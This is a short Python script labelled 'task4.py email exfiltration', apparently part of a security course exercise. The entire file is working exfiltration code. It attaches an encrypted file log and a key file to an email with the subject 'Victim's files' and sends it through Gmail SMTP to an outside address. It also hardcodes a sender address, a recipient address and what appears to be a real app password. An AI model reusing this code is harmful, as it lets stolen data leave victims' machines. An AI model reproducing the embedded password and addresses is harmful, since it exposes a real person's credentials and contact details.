#task4.py email exfiltration
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def send_email():
#configuration
    email_from = "yassin.elkholy@gmail.com"  
    email_to = "ye2300080@tkh.edu.eg"          
    app_pass = "cdqi aarc rhdt ailw"      
    
#email setup
    message = MIMEMultipart()
    message['From'] = email_from
    message['To'] = email_to
    message['Subject'] = "Victim's files"
    
    #Attaching both files
    for filename in ["files.log.enc", "key.bin"]:
        with open(filename, "rb") as f:
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(f.read())
            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', f'attachment; filename="{filename}"')
            message.attach(attachment)
    
    #Sending email
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email_from, app_pass)
    server.sendmail(email_from, email_to, message.as_string())
    server.quit()
    print("Files sent successfully")

if __name__ == "__main__":
    print("Starting file transmission")
    send_email()